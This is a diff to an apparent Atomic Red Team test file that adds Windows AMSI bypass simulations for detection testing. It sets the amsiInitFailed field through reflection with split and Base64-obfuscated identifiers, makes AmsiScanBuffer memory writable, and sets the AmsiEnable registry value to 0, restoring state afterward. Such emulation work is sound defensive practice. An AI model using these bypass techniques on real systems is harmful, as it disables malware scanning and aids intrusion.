@@ -4,7 +4,9 @@ atomic_tests:
 - name: AMSI Bypass - AMSI InitFailed
   auto_generated_guid: 695eed40-e949-40e5-b306-b4031e4154bd
   description: |
-    Existing Atomic Red Team AMSI InitFailed simulation. Generates AMSI related telemetry for detection testing.
+    Original Atomic Red Team AMSI InitFailed simulation.
+    Sets the internal PowerShell amsiInitFailed field to true in the current process.
+    The state is process local and ends when the PowerShell process exits.
   supported_platforms:
   - windows
   executor:
@@ -13,3 +15,266 @@ atomic_tests:
     cleanup_command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
     name: powershell
+
+- name: AMSI InitFailed with split identifiers and evidence
+  auto_generated_guid: 6a8f4ee6-17d5-4a0e-b78d-7ec2cbf7c6ef
+  description: |
+    Builds the AMSI type and field names from string fragments, changes the process local field,
+    executes a harmless marker, writes JSON evidence, and restores the original value.
+  supported_platforms:
+  - windows
+  input_arguments:
+    evidence_dir:
+      description: Directory used for JSON evidence.
+      type: path
+      default: C:\AtomicRedTeam\amsi-evidence
+    marker:
+      description: Unique marker used to correlate telemetry.
+      type: string
+      default: ART_AMSI_SPLIT_IDENTIFIER
+  executor:
+    command: |
+      $ErrorActionPreference = 'Stop'
+      New-Item -ItemType Directory -Path '#{evidence_dir}' -Force | Out-Null
+      $typeName = 'System.Management.Automation.' + 'Am' + 'si' + 'Utils'
+      $fieldName = 'am' + 'si' + 'Init' + 'Failed'
+      $type = [Ref].Assembly.GetType($typeName)
+      if ($null -eq $type) { throw "Unable to resolve $typeName" }
+      $field = $type.GetField($fieldName, 'NonPublic,Static')
+      if ($null -eq $field) { throw "Unable to resolve $fieldName" }
+      $before = [bool]$field.GetValue($null)
+      $path = '#{evidence_dir}\#{marker}-split.json'
+      try {
+        $field.SetValue($null, $true)
+        $during = [bool]$field.GetValue($null)
+        Invoke-Expression 'Write-Output "#{marker}"'
+        [ordered]@{
+          Marker = '#{marker}'
+          Test = 'split_identifier_initfailed'
+          TimestampUtc = [DateTime]::UtcNow.ToString('o')
+          ComputerName = $env:COMPUTERNAME
+          ProcessId = $PID
+          Before = $before
+          During = $during
+          Restored = $false
+        } | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+      }
+      finally {
+        $field.SetValue($null, $before)
+        if (Test-Path $path) {
+          $evidence = Get-Content $path -Raw | ConvertFrom-Json
+          $evidence.Restored = ([bool]$field.GetValue($null) -eq $before)
+          $evidence | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+        }
+      }
+    cleanup_command: |
+      Write-Output 'No persistent AMSI state is expected.'
+    name: powershell
+    elevation_required: false
+
+- name: AMSI InitFailed with Base64 identifiers and process boundary validation
+  auto_generated_guid: 087b9f84-2f44-4a50-a03e-bc50bd32d465
+  description: |
+    Reconstructs AMSI identifiers from Base64, sets the current process field, and launches a clean
+    child PowerShell process to verify that the state does not cross the process boundary.
+  supported_platforms:
+  - windows
+  input_arguments:
+    evidence_dir:
+      description: Directory used for JSON evidence.
+      type: path
+      default: C:\AtomicRedTeam\amsi-evidence
+    marker:
+      description: Unique marker used to correlate telemetry.
+      type: string
+      default: ART_AMSI_BASE64_BOUNDARY
+  executor:
+    command: |
+      $ErrorActionPreference = 'Stop'
+      New-Item -ItemType Directory -Path '#{evidence_dir}' -Force | Out-Null
+      $typeName = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
+      $fieldName = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUluaXRGYWlsZWQ='))
+      $type = [Ref].Assembly.GetType($typeName)
+      if ($null -eq $type) { throw "Unable to resolve $typeName" }
+      $field = $type.GetField($fieldName, 'NonPublic,Static')
+      if ($null -eq $field) { throw "Unable to resolve $fieldName" }
+      $before = [bool]$field.GetValue($null)
+      $path = '#{evidence_dir}\#{marker}-base64-boundary.json'
+      try {
+        $field.SetValue($null, $true)
+        $currentValue = [bool]$field.GetValue($null)
+        $child = '$t=[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'');$f=$t.GetField(''amsiInitFailed'',''NonPublic,Static'');[bool]$f.GetValue($null)'
+        $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($child))
+        $childValue = (& powershell.exe -NoProfile -NonInteractive -EncodedCommand $encoded 2>&1 | Out-String).Trim()
+        Write-Output '#{marker}'
+        [ordered]@{
+          Marker = '#{marker}'
+          Test = 'base64_identifier_process_boundary'
+          TimestampUtc = [DateTime]::UtcNow.ToString('o')
+          ParentProcessId = $PID
+          CurrentProcessValue = $currentValue
+          ChildProcessReportedValue = $childValue
+          OriginalValue = $before
+          Restored = $false
+        } | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+      }
+      finally {
+        $field.SetValue($null, $before)
+        if (Test-Path $path) {
+          $evidence = Get-Content $path -Raw | ConvertFrom-Json
+          $evidence.Restored = ([bool]$field.GetValue($null) -eq $before)
+          $evidence | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+        }
+      }
+    cleanup_command: |
+      Write-Output 'No persistent AMSI state is expected.'
+    name: powershell
+    elevation_required: false
+
+- name: AMSI memory protection telemetry surrogate without patching
+  auto_generated_guid: e07cc0f9-cfad-4761-b83a-710a385a53fa
+  description: |
+    Resolves AmsiScanBuffer, changes its page protection to writable and executable, writes no bytes,
+    and immediately restores the original protection. This generates EDR memory telemetry without
+    patching or impairing AMSI.
+  supported_platforms:
+  - windows
+  input_arguments:
+    evidence_dir:
+      description: Directory used for JSON evidence.
+      type: path
+      default: C:\AtomicRedTeam\amsi-evidence
+    marker:
+      description: Unique marker used to correlate telemetry.
+      type: string
+      default: ART_AMSI_MEMORY_PROTECTION
+  executor:
+    command: |
+      $ErrorActionPreference = 'Stop'
+      New-Item -ItemType Directory -Path '#{evidence_dir}' -Force | Out-Null
+      $signature = @'
+      using System;
+      using System.Runtime.InteropServices;
+      public static class AmsiMemoryTelemetry {
+        [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
+        public static extern IntPtr GetProcAddress(IntPtr module, string name);
+        [DllImport("kernel32.dll", SetLastError=true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool VirtualProtect(IntPtr address, UIntPtr size, uint protection, out uint oldProtection);
+      }
+      '@
+      if (-not ('AmsiMemoryTelemetry' -as [type])) { Add-Type -TypeDefinition $signature }
+      $module = [AmsiMemoryTelemetry]::LoadLibrary('amsi.dll')
+      if ($module -eq [IntPtr]::Zero) { throw 'Unable to load amsi.dll' }
+      $address = [AmsiMemoryTelemetry]::GetProcAddress($module, 'AmsiScanBuffer')
+      if ($address -eq [IntPtr]::Zero) { throw 'Unable to resolve AmsiScanBuffer' }
+      $oldProtect = 0
+      if (-not [AmsiMemoryTelemetry]::VirtualProtect($address, [UIntPtr]1, 0x40, [ref]$oldProtect)) {
+        throw 'Unable to change memory protection'
+      }
+      $path = '#{evidence_dir}\#{marker}-memory-protection.json'
+      try {
+        Write-Output '#{marker}'
+        [ordered]@{
+          Marker = '#{marker}'
+          Test = 'memory_protection_surrogate'
+          TimestampUtc = [DateTime]::UtcNow.ToString('o')
+          ProcessId = $PID
+          AmsiScanBufferAddress = ('0x{0:X}' -f $address.ToInt64())
+          PreviousProtection = ('0x{0:X}' -f $oldProtect)
+          BytesWritten = 0
+          Restored = $false
+        } | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+      }
+      finally {
+        $ignored = 0
+        $restored = [AmsiMemoryTelemetry]::VirtualProtect($address, [UIntPtr]1, $oldProtect, [ref]$ignored)
+        if (Test-Path $path) {
+          $evidence = Get-Content $path -Raw | ConvertFrom-Json
+          $evidence.Restored = [bool]$restored
+          $evidence | ConvertTo-Json -Depth 4 | Set-Content -Path $path -Encoding UTF8
+        }
+      }
+    cleanup_command: |
+      Write-Output 'The original memory protection was restored and no bytes were written.'
+    name: powershell
+    elevation_required: false
+
+- name: AMSIEnable current user registry tampering with exact restoration
+  auto_generated_guid: 667b2e29-a7cb-48d7-a315-a0b4e9a91d49
+  description: |
+    Sets the current user AmsiEnable registry value to zero, records the prior state, pauses for
+    telemetry collection, and restores the exact previous value and registry type.
+  supported_platforms:
+  - windows
+  input_arguments:
+    evidence_dir:
+      description: Directory used for JSON evidence.
+      type: path
+      default: C:\AtomicRedTeam\amsi-evidence
+    marker:
+      description: Unique marker used to correlate telemetry.
+      type: string
+      default: ART_AMSI_REGISTRY_TAMPER
+    dwell_seconds:
+      description: Number of seconds to retain the test value.
+      type: integer
+      default: 5
+  executor:
+    command: |
+      $ErrorActionPreference = 'Stop'
+      New-Item -ItemType Directory -Path '#{evidence_dir}' -Force | Out-Null
+      $path = 'HKCU:\Software\Microsoft\Windows Script\Settings'
+      $name = 'AmsiEnable'
+      $keyExisted = Test-Path $path
+      if (-not $keyExisted) { New-Item -Path $path -Force | Out-Null }
+      $item = Get-ItemProperty -Path $path -Name $name -ErrorAction SilentlyContinue
+      $valueExisted = $null -ne $item
+      $previousValue = if ($valueExisted) { $item.$name } else { $null }
+      $previousKind = if ($valueExisted) { (Get-Item $path).GetValueKind($name).ToString() } else { $null }
+      $statePath = '#{evidence_dir}\#{marker}-registry-state.json'
+      [ordered]@{
+        Marker = '#{marker}'
+        TimestampUtc = [DateTime]::UtcNow.ToString('o')
+        KeyExisted = $keyExisted
+        ValueExisted = $valueExisted
+        PreviousValue = $previousValue
+        PreviousKind = $previousKind
+        Path = $path
+        Name = $name
+        Restored = $false
+      } | ConvertTo-Json -Depth 4 | Set-Content -Path $statePath -Encoding UTF8
+      try {
+        New-ItemProperty -Path $path -Name $name -PropertyType DWord -Value 0 -Force | Out-Null
+        Write-Output '#{marker}'
+        Start-Sleep -Seconds #{dwell_seconds}
+      }
+      finally {
+        $state = Get-Content $statePath -Raw | ConvertFrom-Json
+        if ($state.ValueExisted) {
+          New-ItemProperty -Path $path -Name $name -PropertyType $state.PreviousKind -Value $state.PreviousValue -Force | Out-Null
+        } else {
+          Remove-ItemProperty -Path $path -Name $name -ErrorAction SilentlyContinue
+        }
+        if (-not $state.KeyExisted) {
+          $remaining = (Get-Item $path -ErrorAction SilentlyContinue).Property
+          if ($null -eq $remaining -or $remaining.Count -eq 0) { Remove-Item -Path $path -ErrorAction SilentlyContinue }
+        }
+        $state.Restored = $true
+        $state | ConvertTo-Json -Depth 4 | Set-Content -Path $statePath -Encoding UTF8
+      }
+    cleanup_command: |
+      $statePath = '#{evidence_dir}\#{marker}-registry-state.json'
+      if (Test-Path $statePath) {
+        $state = Get-Content $statePath -Raw | ConvertFrom-Json
+        if (-not (Test-Path $state.Path)) { New-Item -Path $state.Path -Force | Out-Null }
+        if ($state.ValueExisted) {
+          New-ItemProperty -Path $state.Path -Name $state.Name -PropertyType $state.PreviousKind -Value $state.PreviousValue -Force | Out-Null
+        } else {
+          Remove-ItemProperty -Path $state.Path -Name $state.Name -ErrorAction SilentlyContinue
+        }
+      }
+    name: powershell
+    elevation_required: false
